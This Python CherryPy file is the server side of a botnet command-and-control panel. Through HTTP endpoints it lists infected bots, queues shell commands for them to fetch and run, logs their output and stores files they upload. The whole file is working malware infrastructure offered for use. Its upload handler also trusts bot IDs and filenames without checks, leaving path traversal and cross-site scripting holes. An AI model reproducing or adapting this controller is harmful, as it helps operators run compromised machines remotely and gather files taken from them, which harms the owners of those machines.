import cherrypy
import sqlite3
import time
import os


def query_DB(sql, params=()):
    conn = sqlite3.connect('beta.db')
    cursor = conn.cursor()
    result = []
    for row in cursor.execute(sql, params):
        result.append(row)
    conn.close()
    return result


def exec_DB(sql, params=()):
    conn = sqlite3.connect('beta.db')
    cursor = conn.cursor()
    cursor.execute(sql, params)
    conn.commit()
    conn.close()


class Main(object):
    @cherrypy.expose
    def index(self):
        with open("Menu.html", "r") as f:
            html = f.read()
            return html


class CNC(object):
    @cherrypy.expose
    def index(self):
        bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")
        output = ""
        for bot in bot_list:
            output += '<tr><td><a href="bot?botid=%s">%s</a></td><td>%s</td><td><input type="checkbox" id="%s" class="botid" /></td></tr>' % (bot[0], bot[0], time.ctime(bot[1]), bot[0])
        with open("List.html", "r") as f:
            html = f.read()
            html = html.replace("{{bot_table}}", output)
            return html

    @cherrypy.expose
    def bot(self, botid):
        with open("Bot.html", "r") as f:
            html = f.read()
            html = html.replace("{{botid}}", botid)
            return html


class API(object):
    @cherrypy.expose
    def pop(self, botid):
        bot = query_DB("SELECT * FROM bots WHERE name=?", (botid,))
        if not bot:
            exec_DB("INSERT INTO bots VALUES (?, ?)", (botid, time.time()))
        else:
            exec_DB("UPDATE bots SET lastonline=? where name=?", (time.time(), botid))
        cmd = query_DB("SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date", (botid, 0))
        if cmd:
            exec_DB("UPDATE commands SET sent=? where id=?", (1, cmd[0][0]))
            return cmd[0][2]
        else:
            return ""

    @cherrypy.expose
    def report(self, botid, output):
        exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), output, botid))

    @cherrypy.expose
    def push(self, botid, cmd):
        exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), cmd, False, botid))
    
    @cherrypy.expose
    def stdout(self, botid):
        output = ""
        bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date', (botid,))
        for entry in bot_output:
            output += "> %s\n\n" % entry[2]
        bot_queue = query_DB('SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date', (botid, 0))
        for entry in bot_queue:
            output += "> %s\n[PENDING...]\n\n" % entry[2]
        return output

    @cherrypy.expose
    def upload(self, botid, src, uploaded):
        up_dir = os.path.join(os.path.join(os.path.dirname(os.path.realpath(__file__)), "uploads"), botid)
        if not os.path.exists(up_dir):
            os.makedirs(up_dir)
        while os.path.exists(os.path.join(up_dir, src)):
            src = "_" + src
        save_path = os.path.join(up_dir, src)
        outfile = open(save_path, 'wb')
        while True:
            data = uploaded.file.read(8192)
            if not data:
                break
            outfile.write(data)
        outfile.close()
        up_url = "../uploads/" +  botid + "/" + src
        return 'Uploaded: <a href="' + up_url + '">' + up_url + '</a>'


def main():
    config = {'global': {'server.socket_host': 'localhost',
                'server.socket_port': 8080},
                '/static': {
                    'tools.staticdir.on': True,
                    'tools.staticdir.dir':  os.path.join(os.path.dirname(os.path.realpath(__file__)), "static")
                },
                '/uploads': {
                    'tools.staticdir.on': True,
                    'tools.staticdir.dir':  os.path.join(os.path.dirname(os.path.realpath(__file__)), "uploads")
                },
               }
    app = Main()
    app.api = API()
    app.cnc = CNC()
    cherrypy.quickstart(app, config=config)


if __name__ == "__main__":
    main()
